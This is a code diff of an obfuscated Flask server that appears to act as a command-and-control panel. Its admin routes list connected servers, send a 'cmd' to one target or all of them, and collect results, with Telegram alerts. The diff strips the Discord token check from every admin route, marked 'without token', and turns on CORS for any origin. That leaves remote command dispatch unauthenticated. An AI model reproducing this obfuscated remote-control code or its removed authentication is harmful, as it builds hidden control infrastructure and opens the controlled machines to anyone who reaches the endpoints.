@@ -1,11 +1,13 @@
+# -*- coding: utf-8 -*-
 from flask import Flask, request, jsonify
+from flask_cors import CORS
 import threading, time, requests, os, io, json
 
 _k1 = os.environ.get("kek", "")
 _k2 = int(os.environ.get("pep", "0"))
 _k3 = os.environ.get("beb", "")
 _k5 = os.environ.get("duid", "").strip()
-_k4 = [int(x) for x in os.environ.get("us", "").split(",") if x.strip()]
+_k4 = [int(x) for x in os.environ.get("users", "").split(",") if x.strip()]
 if _k2 not in _k4:
     _k4.append(_k2)
 
@@ -13,6 +15,8 @@ if not _k1 or not _k2 or not _k3:
     raise SystemExit("Config missing")
 
 _a1 = Flask(__name__)
+CORS(_a1)
+
 _a2 = []
 _a3 = []
 _a4 = threading.Lock()
@@ -99,27 +103,10 @@ def _h3():
         })
     return jsonify({"ok": True})
 
-def _auth_discord():
-    _auth = request.headers.get("Authorization", "")
-    if not _auth.startswith("Bearer "):
-        return None
-    _tok = _auth[7:]
-    try:
-        _r = requests.get("https://discord.com/api/users/@me",
-                          headers={"Authorization": "Bearer " + _tok}, timeout=10)
-        if _r.status_code != 200:
-            return None
-        _uid = _r.json().get("id")
-        if _k5 and str(_uid) != str(_k5):
-            return None
-        return _r.json()
-    except:
-        return None
+# ==== ADMIN (без токена) ====
 
 @_a1.route("/admin/servers", methods=["GET"])
 def _hadmin_servers():
-    if not _auth_discord():
-        return jsonify({"error": "access denied"}), 403
     with _a4:
         _out = []
         for _p, _info in _a5.items():
@@ -141,8 +128,6 @@ def _hadmin_servers():
 
 @_a1.route("/admin/send", methods=["POST"])
 def _hadmin_send():
-    if not _auth_discord():
-        return jsonify({"error": "access denied"}), 403
     _d = request.json or {}
     _cmd = (_d.get("cmd") or "").strip()
     _tgt = _d.get("target", "all")
@@ -161,12 +146,12 @@ def _hadmin_send():
 
 @_a1.route("/admin/results", methods=["GET"])
 def _hadmin_results():
-    if not _auth_discord():
-        return jsonify({"error": "access denied"}), 403
     with _a4:
         _out = _a3[:]
         _a3.clear()
     return jsonify(_out)
+
+# ==== TELEGRAM ====
 
 def _s1(_t, _kb=None, _to=None):
     _target = _to if _to else _k2
